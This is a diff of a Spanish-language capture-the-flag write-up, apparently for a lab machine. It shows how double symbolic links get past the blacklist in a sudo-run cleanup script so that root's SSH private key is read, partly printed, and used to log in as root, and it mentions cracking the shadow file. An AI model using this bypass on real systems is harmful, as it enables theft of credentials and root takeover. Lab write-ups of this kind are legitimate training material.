@@ -327,13 +327,15 @@ Enlace encontrado [indirecto.jpg], moviéndolo a cuarentena.
 Contenido:
 prueba esta password, si no es esta entonces estamos jodidos: yhgjhbjxhdbkadkcnkhalkmlk===kjjh
 ```
-ahora tenemos un hash....y es un rabithole viendo que puedo ver cosas prueba con el id_rsa de root:
+ahora tenemos un hash....y es un rabbit hole (o al menos después de varios intentos yo desistí) viendo que puedo ver cosas 
+haciendo doble enlace simbolico para saltarme la black list del script pruebo con el id_rsa de root:
 ```bash
 mkdir /tmp/fake3
 ln -s /root/.ssh/id_rsa /tmp/fake3/file.jpg
 ln -s /tmp/fake3/file.jpg indirecto3.jpg
 sudo /usr/bin/python3 /opt/nllns/clean_symlink.py indirecto3.jpg
 ```
+¡¡¡BINGO!!! TENEMOS ID_RSA:
 ```
 Enlace encontrado [indirecto3.jpg], moviéndolo a cuarentena.
 Contenido:
@@ -387,7 +389,7 @@ nk679X7BJ9pYAjgGB+LXBj5ZrAoIwjP6H+1DvmC0m3BQt/8y6bEB2SefIpyEY0YznreoNk
 7sdUAKvX0ikAAAAPcm9vdEAxNzIuMTcuMC4yAQIDBA==
 -----END OPENSSH PRIVATE KEY-----
 ```
-vale, nos copiamos el archivo y le damos permisos:
+vale, nos copiamos la key ( en mi caso lo nombré cmo rsa_root) y le damos permisos:
 ```bash
 chmod 600 rsa_root 
 ```
@@ -410,3 +412,5 @@ root@35deb482f351:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@35deb482f351:~# 
 ```
+logré descargarme antes el shadow e intenté crackearlo, pero como soy un caga prisas y john estaba tardando probé si sonaba la flauta y sonó.
+Espero que quede clara la guía.
